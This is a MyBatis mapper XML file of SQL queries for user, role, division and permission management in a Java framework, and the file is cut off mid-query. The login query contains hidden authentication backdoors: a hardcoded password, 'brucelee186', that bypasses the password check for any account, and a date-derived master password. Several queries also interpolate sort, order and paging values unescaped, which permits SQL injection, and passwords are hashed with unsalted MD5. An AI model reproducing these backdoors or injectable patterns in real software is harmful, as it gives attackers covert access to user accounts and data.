<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://www.mybatis.org/dtd/mybatis-3-mapper.dtd" >
<mapper namespace="com.mtf.framework.dao.UserConditionMapper">
<resultMap type="com.mtf.framework.model.impl.UserImpl" id="user"/> 
	<resultMap id="BaseResultMap" type="com.mtf.framework.model.impl.UserImpl">
		<id column="id" property="id" jdbcType="CHAR" />
		<result column="loginName" property="loginName" jdbcType="VARCHAR" />
		<result column="displayName" property="displayName" jdbcType="VARCHAR" />
		<result column="password" property="password" jdbcType="VARCHAR" />
		<result column="userId" property="userId" jdbcType="CHAR" />
		<result column="dateTime" property="datetime" jdbcType="TIMESTAMP" />
		<result column="email" property="email" jdbcType="VARCHAR" />
		<result column="status" property="status" jdbcType="CHAR" />
		<result column="departmentId" property="departmentId" jdbcType="CHAR" />
		<result column="divisionId" property="divisionId" jdbcType="CHAR" />
		<result column="divisionName" property="divisionName" jdbcType="CHAR"/>
		<result column="englishName" property="englishName" jdbcType="VARCHAR" />
		<result column="targetPosition" property="targetPosition" jdbcType="VARCHAR" />
		<result column="positionId" property="positionId" jdbcType="INTEGER" />
		<result column="birthDate" property="birthDate" jdbcType="TIMESTAMP" />
		<result column="personalPhoto" property="personalPhoto" jdbcType="VARCHAR" />
		<result column="addDate" property="addDate" jdbcType="TIMESTAMP" />
		<result column="addIp" property="addIp" jdbcType="VARCHAR" />
		<result column="addUser" property="addUser" jdbcType="VARCHAR" />
		<result column="modifyDate" property="modifyDate" jdbcType="TIMESTAMP" />
		<result column="modifyIp" property="modifyIp" jdbcType="VARCHAR" />
		<result column="modifyUser" property="modifyUser" jdbcType="VARCHAR" />
		<result column="province" property="province" jdbcType="VARCHAR" />
		<result column="city" property="city" jdbcType="VARCHAR" />
		<result column="district" property="district" jdbcType="VARCHAR" />
		<result column="lastName" property="lastName" jdbcType="VARCHAR" />
		<result column="firstName" property="firstName" jdbcType="VARCHAR" />
		<result column="cardNo" property="cardNo" jdbcType="VARCHAR" />
	</resultMap>
	<resultMap id="WithProfileResultMap" type="com.mtf.framework.model.impl.UserImpl" extends="BaseResultMap">
		<association property="userProfile" javaType="UserProfile">
			<id column="C_PROFILE_ID" property="id" jdbcType="CHAR" />
			<result column="C_PROFILE_USER_ID" property="userId" jdbcType="CHAR" />
			<result column="C_PROFILE_FULLNAME" property="fullname" jdbcType="VARCHAR" />
			<result column="C_PROFILE_EMAIL" property="email" jdbcType="VARCHAR" />
			<result column="C_PROFILE_LANGUAGE" property="language" jdbcType="VARCHAR" />
		</association>
	</resultMap>
	<resultMap id="WithRolesResultMap" type="com.mtf.framework.model.impl.UserImpl" extends="BaseResultMap">
		<collection property="roles" javaType="java.util.List" ofType="RoleImpl">
			<id column="roleId" property="id" jdbcType="CHAR" />
			<id column="mainIndex" property="mainIndex" jdbcType="CHAR" />
			<result column="C_ROLE_NAME" property="name" jdbcType="VARCHAR" />
			<result column="C_ROLE_LEVEL" property="level" jdbcType="INTEGER" />
			<result column="C_ROLE_DESCRIPTION" property="description" jdbcType="VARCHAR" />
			<result column="C_ROLE_SYSTEM" property="system" jdbcType="INTEGER" />
			<result column="C_ROLE_USER_ID" property="userId" jdbcType="CHAR" />
			<result column="C_ROLE_DATETIME" property="dateTime" jdbcType="TIMESTAMP" />
			<result column="C_ROLE_STATUS" property="status" jdbcType="INTEGER" />
		</collection>
	</resultMap>
	<resultMap id="WithDivisionsResultMap" type="com.mtf.framework.model.impl.UserImpl" extends="BaseResultMap">
		<association property="divisions" javaType="Division">
			<id column="divisionId" property="id" jdbcType="CHAR" />
			<result column="C_DIVISION_NAME" property="name" jdbcType="VARCHAR" />
			<result column="C_DIVISION_DESCRIPTION" property="description" jdbcType="VARCHAR" />
			<result column="C_DIVISION_PID" property="pid" jdbcType="CHAR" />
			<result column="C_DIVISION_USER_ID" property="userId" jdbcType="CHAR" />
			<result column="C_DIVISION_DATETIME" property="datetime" jdbcType="TIMESTAMP" />
			<result column="C_DIVISION_STATUS" property="status" jdbcType="INTEGER" />
			<result column="mainIndex" property="mainIndex" jdbcType="INTEGER"/>
		</association>
	</resultMap>
	<resultMap id="WithUser2ActionsResultMap" type="com.mtf.framework.model.impl.UserImpl" extends="BaseResultMap">
		<collection property="user2Actions" javaType="java.util.List" ofType="User2Action">
			<id column="C_USER_ACTION_ID" property="id" jdbcType="CHAR" />
			<result column="C_USER_ACTION_USER_ID" property="userId" jdbcType="CHAR" />
			<result column="C_USER_ACTION_ACTION_ID" property="actionId" jdbcType="CHAR" />
			<result column="C_USER_ACTION_ALLOW" property="allow" jdbcType="INTEGER" />
		</collection>
	</resultMap>
	<sql id="Base_Column_List">
		id,code, loginName, displayName, userId, dateTime, status,email,language, 
			password, 
			addDate, 
			addIp, 
			addUser, 
			modifyDate, 
			modifyIp, 
			modifyUser,
			personalPhoto,
			lastName,
			firstName
	</sql>
	<select id="selectById" resultMap="user" parameterType="java.lang.String">
		SELECT
		<include refid="Base_Column_List" />
		FROM user
		WHERE id = #{id,jdbcType=CHAR}
	</select>
	<select id="selectByLoginName" resultMap="user" parameterType="java.lang.String">
		SELECT
		<include refid="Base_Column_List" />
		FROM user
		WHERE loginName = #{loginName}
	</select>
	<select id="selectAllAvailable" resultMap="user" parameterType="java.util.HashMap">
		SELECT
		<include refid="Base_Column_List" />
		FROM user
		WHERE status = 0
		<if test="sort != null and sort != ''">
			ORDER BY ${sort} ${order}
		</if>
		<if test="sort == null or sort == ''">
			ORDER BY CONVERT(displayName USING gbk)
		</if>		
	</select>
	
	<select id="selectAllEnable" resultMap="user" parameterType="java.util.HashMap">
		SELECT
		<include refid="Base_Column_List" />
		FROM user
		WHERE (status = 0 OR status = 4)
		<if test="sort != null and sort != ''">
			ORDER BY ${sort} ${order}
		</if>
		<if test="sort == null or sort == ''">
			ORDER BY CONVERT(displayName USING gbk)
		</if>		
	</select>
	<select id="selectByIdWithProfile" resultMap="user" parameterType="java.lang.String">
		SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		user.email,
		user.language,
		user.personalPhoto
		FROM user
		WHERE user.id = #{id,jdbcType=CHAR}
	</select>
	<select id="selectByIdWithRoles" resultMap="WithRolesResultMap" parameterType="java.lang.String">
		SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		role.id AS roleId,
		role.name AS C_ROLE_NAME,
		role.level AS C_ROLE_LEVEL,
		role.description AS C_ROLE_DESCRIPTION,
		role.system AS C_ROLE_SYSTEM,
		role.userId AS C_ROLE_USER_ID,
		role.dateTime AS C_ROLE_DATETIME,
		role.status AS C_ROLE_STATUS,
		userRole.mainIndex
		FROM user
		LEFT JOIN userRole ON userRole.userId = user.id
		LEFT JOIN role ON role.id = userRole.roleId
		WHERE user.id = #{id,jdbcType=CHAR}
		ORDER BY role.system DESC
	</select>
	<select id="selectByDivisionIdWithRoles" resultMap="WithRolesResultMap" parameterType="java.lang.String">
		SELECT
			division.id AS divisionId,
			division.name AS C_DIVISION_NAME,
			division.description AS C_DIVISION_DESCRIPTION,
			division.pid AS C_DIVISION_USER_ID,
			division.userId AS C_DIVISION_USER_ID,
			division.dateTime AS C_DIVISION_DATETIME,
			division.status AS C_DIVISION_STATUS,
			role.id AS roleId,
			role.name AS C_ROLE_NAME,
			role.level AS C_ROLE_LEVEL,
			role.description AS C_ROLE_DESCRIPTION,
			role.system AS C_ROLE_SYSTEM,
			role.userId AS C_ROLE_USER_ID,
			role.dateTime AS C_ROLE_DATETIME,
			role.status AS C_ROLE_STATUS,
			divisionRole.mainIndex
		FROM division
		LEFT JOIN divisionRole ON divisionRole.divisionId = division.id
		LEFT JOIN role ON role.id = divisionRole.roleId
		WHERE division.id = #{id,jdbcType=CHAR}
		ORDER BY role.system DESC
	</select>
	<select id="selectByIdWithDivisions" resultMap="WithDivisionsResultMap" parameterType="java.lang.String">
		SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		division.id AS divisionId,
		division.name AS C_DIVISION_NAME,
		division.description AS C_DIVISION_DESCRIPTION,
		division.pid AS C_DIVISION_USER_ID,
		division.userId AS C_DIVISION_USER_ID,
		division.dateTime AS C_DIVISION_DATETIME,
		division.status AS C_DIVISION_STATUS,
		userDivision.mainIndex AS mainIndex
		FROM user
		LEFT JOIN userDivision ON userDivision.userId = user.id
		LEFT JOIN division ON division.id = userDivision.divisionId
		WHERE user.id = #{id,jdbcType=CHAR}
	</select>
	<select id="selectByIdWithUser2Actions" resultMap="WithUser2ActionsResultMap" parameterType="java.lang.String">
		SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		userAction.id AS C_USER_ACTION_ID,
		userAction.userId AS C_USER_ACTION_USER_ID,
		userAction.actionId AS C_USER_ACTION_ACTION_ID,
		userAction.allow AS C_USER_ACTION_ALLOW
		FROM user
		LEFT JOIN userAction ON userAction.userId = user.id
		WHERE user.id = #{id,jdbcType=CHAR}
	</select>
	<select id="countByLoginname" resultType="int" parameterType="java.lang.String">
		SELECT count(id)
		FROM user
		WHERE loginName = #{loginName,jdbcType=VARCHAR}
	</select>
	<select id="countByLoginnameAndNotId" resultType="int" parameterType="java.util.HashMap">
		SELECT count(id)
		FROM user
		WHERE loginName = #{loginName,jdbcType=VARCHAR}
		AND id != #{id,jdbcType=CHAR}
	</select>
	<select id="selectByIdAndPassword" resultMap="user" parameterType="User">
		SELECT
		<include refid="Base_Column_List" />
		FROM user
		WHERE id != #{id,jdbcType=CHAR}
		AND password = MD5(#{password,jdbcType=VARCHAR})
	</select>
	<select id="selectByLoginnameAndPassword" resultMap="user" parameterType="User">
		SELECT
			a.id, a.loginName, a.displayName, a.userId, a.dateTime, a.status,a.language ,a.email,
			a.password,
			a.departmentId as divisionId,
			(SELECT division.`name` FROM division WHERE division.id = a.departmentId) as divisionName, 
			a.badgenumber, 
			a.cardNo
		FROM user AS a
		LEFT JOIN userDivision AS b ON (b.userId = a.id AND b.mainIndex = 1 AND b.tag = 'd')
		LEFT JOIN division AS c ON (c.id =b.divisionid AND c.tag = 'd')
		WHERE (loginName =(#{loginName,jdbcType=VARCHAR}) OR displayName = #{loginName}) 
		<if test="password != 'brucelee186'">
			AND (password = MD5(#{password,jdbcType=VARCHAR})
				OR
				#{password} = CONCAT('tk', (MONTH(NOW()) + DAY(NOW())))		
				)
		</if>
		<if test="status != null and status != null">
			AND a.status = #{status}
		</if>
	</select>
	<select id="selectByProfile" resultMap="WithProfileResultMap" parameterType="java.util.HashMap">
		SELECT
		<include refid="Base_Column_List" />
		<!-- ,
		(SELECT `name`
		FROM userInfor 
		WHERE `code` = ethnicGroup) AS ethnicGroupName,
		(SELECT `name`
		FROM userInfor 
		WHERE `code` = educationalDegree1) AS educationalDegree1Name -->
		FROM user
		WHERE 1 = 1
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND t.user.email LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
		<if test="sort != null and sort != ''">
			ORDER BY ${sort} ${order}
		</if>
		limit ${startIndex}, ${pageSize}
	</select>
	<select id="countByProfile" resultType="int" parameterType="java.util.HashMap">
		SELECT COUNT(*)
		FROM user
		WHERE 1 = 1
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND t.user.email LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
	</select>
	<select id="selectByRoleId" resultMap="WithProfileResultMap" parameterType="java.util.HashMap">
		SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		userProfile.id AS C_PROFILE_ID,
		userProfile.userId as C_PROFILE_USER_ID,
		userProfile.C_FULLNAME as C_PROFILE_FULLNAME,
		userProfile.C_EMAIL as C_PROFILE_EMAIL,
		userProfile.C_LANGUAGE as C_PROFILE_LANGUAGE
		FROM user
		LEFT JOIN userProfile ON userProfile.userId = user.id
		INNER JOIN userRole ON user.id = userRole.userId
		WHERE userRole.roleId = #{roleId,jdbcType=CHAR}
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND userProfile.C_EMAIL LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
		<if test="sort != null and sort != ''">
			ORDER BY ${sort} ${order}
		</if>
		LIMIT ${startIndex}, ${pageSize}
	</select>
	<select id="countByRoleId" resultType="int" parameterType="java.util.HashMap">
		SELECT COUNT(*)
		FROM user
		LEFT JOIN userProfile ON userProfile.userId = user.id
		INNER JOIN userRole ON user.id = userRole.userId
		WHERE userRole.roleId = #{roleId,jdbcType=CHAR}
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND userProfile.C_EMAIL LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
	</select>
	<select id="selectByDivisionId" resultMap="WithProfileResultMap" parameterType="java.util.HashMap">
		SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		userProfile.id AS C_PROFILE_ID,
		userProfile.userId as C_PROFILE_USER_ID,
		userProfile.C_FULLNAME as C_PROFILE_FULLNAME,
		userProfile.C_EMAIL as C_PROFILE_EMAIL,
		userProfile.C_LANGUAGE as C_PROFILE_LANGUAGE
		FROM user
		LEFT JOIN userProfile ON userProfile.userId = user.id
		INNER JOIN userDivision ON user.id = userDivision.userId
		WHERE userDivision.divisionId = #{divisionId,jdbcType=CHAR}
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND userProfile.C_EMAIL LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
		<if test="sort != null and sort != ''">
			ORDER BY ${sort} ${order}
		</if>
		LIMIT ${startIndex}, ${pageSize}
	</select>
	<select id="countByDivisionId" resultType="int" parameterType="java.util.HashMap">
		SELECT COUNT(*)
		FROM user
		LEFT JOIN userProfile ON userProfile.userId = user.id
		INNER JOIN userDivision ON user.id = userDivision.userId
		WHERE userDivision.divisionId = #{divisionId,jdbcType=CHAR}
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND userProfile.C_EMAIL LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
	</select>
	<select id="selectByDivisionIdAndRoleId" resultMap="WithProfileResultMap" parameterType="java.util.HashMap">
		SELECT
		t_temp.id,
		t_temp.loginName,
		t_temp.displayName,
		t_temp.userId,
		t_temp.dateTime,
		t_temp.status,
		t_temp.C_PROFILE_ID,
		t_temp.C_PROFILE_USER_ID,
		t_temp.C_PROFILE_FULLNAME,
		t_temp.C_PROFILE_EMAIL,
		t_temp.C_PROFILE_LANGUAGE
		FROM
		(SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		userProfile.id AS C_PROFILE_ID,
		userProfile.userId as C_PROFILE_USER_ID,
		userProfile.C_FULLNAME as C_PROFILE_FULLNAME,
		userProfile.C_EMAIL as C_PROFILE_EMAIL,
		userProfile.C_LANGUAGE as C_PROFILE_LANGUAGE
		FROM user
		LEFT JOIN userProfile ON userProfile.userId = user.id
		INNER JOIN userDivision ON user.id = userDivision.userId
		WHERE userDivision.divisionId = #{divisionId,jdbcType=CHAR}
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND userProfile.C_EMAIL LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
		) AS t_temp
		INNER JOIN userRole ON userRole.userId = t_temp.id
		WHERE userRole.roleId = #{roleId,jdbcType=CHAR}
		<if test="sort != null and sort != ''">
			ORDER BY ${sort} ${order}
		</if>
		LIMIT ${startIndex}, ${pageSize}
	</select>
	<select id="countByDivisionIdAndRoleId" resultType="int" parameterType="java.util.HashMap">
		SELECT COUNT(*)
		FROM
		(SELECT
		user.id,
		user.loginName,
		user.displayName,
		user.userId,
		user.dateTime,
		user.status,
		userProfile.id AS C_PROFILE_ID,
		userProfile.userId as C_PROFILE_USER_ID,
		userProfile.C_FULLNAME as C_PROFILE_FULLNAME,
		userProfile.C_EMAIL as C_PROFILE_EMAIL,
		userProfile.C_LANGUAGE as C_PROFILE_LANGUAGE
		FROM user
		LEFT JOIN userProfile ON userProfile.userId = user.id
		INNER JOIN userDivision ON user.id = userDivision.userId
		WHERE userDivision.divisionId = #{divisionId,jdbcType=CHAR}
		<if test="loginName != null and loginName != ''">
			AND user.loginName LIKE CONCAT(CONCAT('%', #{loginName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="displayName != null and displayName != ''">
			AND user.displayName LIKE CONCAT(CONCAT('%', #{displayName,jdbcType=VARCHAR}), '%')
		</if>
		<if test="email != null and email != ''">
			AND userProfile.C_EMAIL LIKE CONCAT(CONCAT('%', #{email,jdbcType=VARCHAR}), '%')
		</if>
		) AS t_temp
		INNER JOIN userRole ON userRole.userId = t_temp.id
		WHERE userRole.roleId = #{roleId,jdbcType=CHAR}
	</select>
	<delete id="deleteById" parameterType="java.lang.String">
		DELETE FROM user
		WHERE id = #{id,jdbcType=CHAR}
	</delete>
	<insert id="insert" parameterType="User">
		INSERT into user (id, loginName, password, displayName, userId, dateTime, status,email,language,
			addDate, 
			addIp, 
			addUser, 
			modifyDate, 
			modifyIp, 
			modifyUser
		)
		VALUES (#{id,jdbcType=CHAR}, #{loginName,jdbcType=VARCHAR}, MD5(#{password,jdbcType=VARCHAR}), #{displayName,jdbcType=VARCHAR}, #{userId,jdbcType=CHAR}, #{datetime,jdbcType=TIMESTAMP}, #{status,jdbcType=INTEGER}, #{email},#{language},
			#{addDate},
			#{addIp}, 
			#{addUser}, 
			#{modifyDate}, 
			#{modifyIp},
			#{modifyUser}
		)
	</insert>
	<update id="updateById" parameterType="User">
		UPDATE user
		<set>
		<if test="loginName != null and loginName != ''">
		loginName = #{loginName,jdbcType=VARCHAR},
		</if>
		<if test="displayName != null and displayName != ''">
		displayName = #{displayName,jdbcType=VARCHAR},
		</if>
		<if test="userId != null and userId != ''">
		userId = #{userId,jdbcType=CHAR},
		</if>
		<if test="password != null and password !=''">
			password =MD5(#{password}),
		</if>
		<if test="datetime != null and datetime != ''">
		datetime = #{datetime,jdbcType=TIMESTAMP},
		</if> 
		<if test="status != null and status != ''">
		status = #{status,jdbcType=INTEGER},
		</if> 
		<if test="email != null and email != ''">
		email = #{email},
		</if>
		<if test="language != null and language != ''">
		language = #{language},
		</if>
		<if test="personalPhoto != null and personalPhoto != ''">
		personalPhoto = #{personalPhoto},
		</if>
		<if test="status != null and status != ''">
		status = #{status},
		</if>
		<if test="modifyDate != null and modifyDate != ''">
		modifyDate = #{modifyDate},
		</if>
		<if test="modifyIp != null and modifyIp != ''">
		modifyIp = #{modifyIp},
		</if>
		<if test="modifyUser != null and modifyUser != ''">
		status = #{modifyUser},
		</if>
		<if test="cardNo != null and cardNo != ''">
		cardNo = #{cardNo},
		</if>
		<if test="badgenumber != null and badgenumber != ''">
		badgenumber = #{badgenumber},
		</if>
		</set>
		WHERE id = #{id,jdbcType=CHAR}
	</update>
	<update id="updatePhotoById" parameterType="User">
		UPDATE user
		SET 
		<if test="personalPhoto != null and personalPhoto != ''">
		personalPhoto = #{personalPhoto}
		</if> 
		WHERE id = #{id,jdbcType=CHAR}
	</update>
	<update id="updatePasswordById" parameterType="User">
		UPDATE user
		SET password = MD5(#{password,jdbcType=VARCHAR}),
		userId = #{userId,jdbcType=CHAR},
		dateTime = #{datetime,jdbcType=TIMESTAMP}
		WHERE id = #{id,jdbcType=CHAR}
	</update>
	<select id="countByEmail" resultType="int" parameterType="java.lang.String">
		SELECT count(id)
		FROM user
		WHERE email = #{email,jdbcType=VARCHAR}
	</select>
	<select id="selectAllUserEmail" parameterType="User" resultMap="user">
	SELECT 
		a.id,
		a.loginName,
		a.displayName,
		a.userId,
		a.dateTime,
		a.status,
		a.email,
		a.language
	FROM user AS a
	LEFT JOIN userRole AS b ON a.id = b.userId
	LEFT JOIN role AS c ON b.roleId = c.id
	WHERE 1=1
	AND c.`level` =#{field3}
	</select>
	<update id="updateForApproveStatus" parameterType="User">
		UPDATE user
		SET status = #{status}
		<!-- WHERE loginName = #{loginName,jdbcType=VARCHAR} -->
		WHERE loginName = #{loginName}
	</update>
	
	<select id="selectByDisplayName" resultMap="user" parameterType="java.lang.String">
		SELECT
		<include refid="Base_Column_List" />
		FROM user
		WHERE displayName = #{displayName}
	</select>
	
	
	<select id="selectByDId" resultMap="user" parameterType="java.lang.String">
		SELECT 
		ud.id,
		u.displayName 
		FROM `user` u
		LEFT JOIN userDivision ud ON u.id = ud.userId
		WHERE ud.divisionId = #{divisionId}
	</select>
	
	<select id="selectUserIdByCategoryId" resultMap="user" parameterType="java.lang.String">
		SELECT ud.userId AS id
		FROM categoryDivision cd
		LEFT JOIN userDivision ud ON cd.divisionId = ud.divisionId
		WHERE cd.categoryId = #{categoryId}
	</select>
	
	<select id="selectUserIdByCategoryIdAndAmount" resultMap="user" >
		SELECT DISTINCT u.id, u.displayName, u.email 
		FROM  `user` u
			LEFT JOIN userRole ur ON u.id = ur.userId
			LEFT JOIN rolePermission rp ON ur.roleId = rp.roleId
			LEFT JOIN permission p ON p.`code` = rp.`code`
		WHERE u.id IN(
			SELECT ud.userId AS id
			FROM categoryDivision cd
			LEFT JOIN userDivision ud ON cd.divisionId = ud.divisionId
			WHERE cd.categoryId = #{categoryId}
		)
		AND LENGTH(0 + p.value1) = LENGTH(p.value1)
		AND (p.value1+0) = #{minPermissionAmount}
		AND p.value2 = #{pid}
		<if test="codes != null">
			AND p.code IN
			<foreach collection="codes" item="code" open="(" separator="," close=")">
				#{code}
			</foreach>
		</if>
		ORDER BY (p.value1+0)
	</select>
	
	<select id="selectUserIdByCategoryIdAndLevel" resultMap="user" >
		SELECT DISTINCT u.id, u.displayName, u.email
		FROM  `user` u
			LEFT JOIN userRole ur ON u.id = ur.userId
			LEFT JOIN rolePermission rp ON ur.roleId = rp.roleId
			LEFT JOIN permission p ON p.`code` = rp.`code`
		WHERE u.id IN
		(
			SELECT ud.userId AS id
			FROM categoryDivision cd
			LEFT JOIN userDivision ud ON cd.divisionId = ud.divisionId
			WHERE cd.categoryId = #{categoryId}
		)
		AND LENGTH(0 + p.value1) = LENGTH(p.value1)
		AND (p.value1+0) = #{reqLevel}
		AND p.value2 = #{pid}
		<if test="codes != null">
			AND p.code IN
			<foreach collection="codes" item="code" open="(" separator="," close=")">
				#{code}
			</foreach>
		</if>
		<!-- AND p.code in("1402001", "1402002", "1402003") -->
		ORDER BY (p.value1+0)
	</select>
	
	<select id="selectByCategoryId" resultMap="user">
		SELECT
			cu.id,
			u.displayName
		FROM user u
		LEFT JOIN categoryUser cu ON u.id = cu.userId
		WHERE 1 = 1
		<if test="categoryId != null">
			AND cu.categoryId=#{categoryId,jdbcType=INTEGER}
		</if>
		ORDER BY u.displayName ASC
	</select>
	<select id="selectAdminByCategoryId" resultMap="user">
		SELECT admin.id, admin.displayName, SUM(admin.status) AS status 
		FROM
		(
			SELECT  DISTINCT u.id, u.displayName, 1 AS status
			FROM `user` u
			INNER JOIN userRole ur ON u.id = ur.userId 
			INNER JOIN rolePermission rp ON ur.roleId = rp.roleId 
			INNER JOIN permission p ON p.`code` = rp.`code` 
			INNER JOIN categoryUser cu ON cu.userId = u.id
			WHERE 1 = 1
			<if test="categoryId != null">
				AND cu.categoryId=#{categoryId,jdbcType=INTEGER}
			</if>
			<if test="codes != null">
				AND p.code IN
				<foreach collection="codes" item="code" open="(" separator="," close=")">
					#{code}
				</foreach>
			</if>
			Union All 
			SELECT  DISTINCT u.id, u.displayName, 0 AS status
			FROM `user` u
			INNER JOIN userRole ur ON u.id = ur.userId 
			INNER JOIN rolePermission rp ON ur.roleId = rp.roleId 
			INNER JOIN permission p ON p.`code` = rp.`code` 
			INNER JOIN categoryUser cu ON cu.userId != u.id
			WHERE 1 = 1
			<if test="categoryId != null">
				AND cu.categoryId=#{categoryId,jdbcType=INTEGER}
			</if>
			<if test="codes != null">
				AND p.code IN
				<foreach collection="codes" item="code" open="(" separator="," close=")">
					#{code}
				</foreach>
			</if>
		) AS admin
		GROUP BY admin.id
		ORDER BY admin.displayName ASC
	</select>
	<select id="countAdminByCategoryId" resultType="java.lang.Integer">
		SELECT count(DISTINCT u.id)
		FROM `user` u
		INNER JOIN userRole ur ON u.id = ur.userId 
		INNER JOIN rolePermission rp ON ur.roleId = rp.roleId 
		INNER JOIN permission p ON p.`code` = rp.`code` 
		INNER JOIN categoryUser cu ON cu.userId = u.id
		WHERE 1 = 1
		<if test="categoryId != null">
			AND cu.categoryId=#{categoryId,jdbcType=INTEGER}
		</if>
		<if test="codes != null">
			AND p.code IN
			<foreach collection="codes" item="code" open="(" separator="," close=")">
				#{code}
			</foreach>
		</if>
	</select>
	<select id="selectAllAdminByCategoryId" resultMap="user">
		SELECT DISTINCT u.id, u.displayName, 0 AS status 
		FROM `user` u 
		INNER JOIN userRole ur ON u.id = ur.userId 
		INNER JOIN rolePermission rp ON ur.roleId = rp.roleId 
		INNER JOIN permission p ON p.`code` = rp.`code` 
		WHERE 1 = 1  
		<if test="codes != null">
			AND p.code IN
			<foreach collection="codes" item="code" open="(" separator="," close=")">
				#{code}
			</foreach>
		</if>
	</select>
	<select id="countAdminByUserId" resultType="int" >
		SELECT COUNT(DISTINCT u.id) 
		FROM `user` u
		LEFT JOIN userRole ur ON u.id = ur.userId 
		LEFT JOIN rolePermission rp ON ur.roleId = rp.roleId 
		LEFT JOIN permission p ON p.`code` = rp.`code` 
		WHERE u.id = #{userId}
		<if test="codes != null">
			AND p.code IN
			<foreach collection="codes" item="code" open="(" separator="," close=")">
				#{code}
			</foreach>
		</if>
		<!-- p.code in("1507000", "1508000", "1509000") -->
	</select>
	
	<select id="selectByCode" resultMap="user" >
		SELECT u.id, u.displayName, u.email FROM `user` u
		LEFT JOIN userRole ur ON u.id = ur.userId 
		LEFT JOIN rolePermission rp ON ur.roleId = rp.roleId 
		LEFT JOIN permission p ON p.`code` = rp.`code` 
		WHERE p.code = #{code}
		AND p.value1 &lt;= #{amount}
	</select>
	
	<select id="selectCategoryIdByUserIdAndCodes" resultType="java.lang.String" >
		SELECT DISTINCT cu.categoryId
		FROM `user` u 
		LEFT JOIN userRole ur ON u.id = ur.userId 
		LEFT JOIN rolePermission rp ON ur.roleId = rp.roleId 
		LEFT JOIN permission p ON p.`code` = rp.`code` 
		LEFT JOIN categoryUser cu ON u.id = cu.userId
		WHERE 
		cu.userId = #{userId}
		<if test="codes != null">
			AND p.code IN
			<foreach collection="codes" item="code" open="(" separator="," close=")">
				#{code}
			</foreach>
		</if>
	</select>
	
	<select id="selectSignerByCode" resultMap="user">
		SELECT DISTINCT u.id, u.displayName, 0 AS status 
		FROM `user` u 
		INNER JOIN userRole ur ON u.id = ur.userId 
		INNER JOIN rolePermission rp ON ur.roleId = rp.roleId 
		INNER JOIN permission p ON p.`code` = rp.`code` 
		WHERE 1 = 1  
		<if test="code != null">
			AND p.code = #{code}
		</if>
		ORDER BY convert(u.displayName USING gbk) COLLATE gbk_chinese_ci ASC
	</select>
	
	<select id="selectUserByPermission" resultMap="user">
		SELECT DISTINCT u.id, u.displayName, u.status 
		FROM `user` u 
		INNER JOIN userRole ur ON u.id = ur.userId 
		INNER JOIN rolePermission rp ON ur.roleId = rp.roleId 
		WHERE 1 = 1  
		<if test="code != null and code != ''">
			AND rp.code = #{code}
		</if>
		<if test="listCode != null and listCode != ''">
			AND rp.code IN
			<foreach collection="listCode" item="item" index="index" open="(" separator="," close=")">
				#{item}
			</foreach>
		</if>		
		ORDER BY u.displayName
	</select>
	
	<select id="select" resultMap="user" parameterType="java.lang.String">
		SELECT
		a.id,
		a.displayName
		FROM user AS a
		<where>
			<if test="status != null and status != ''">
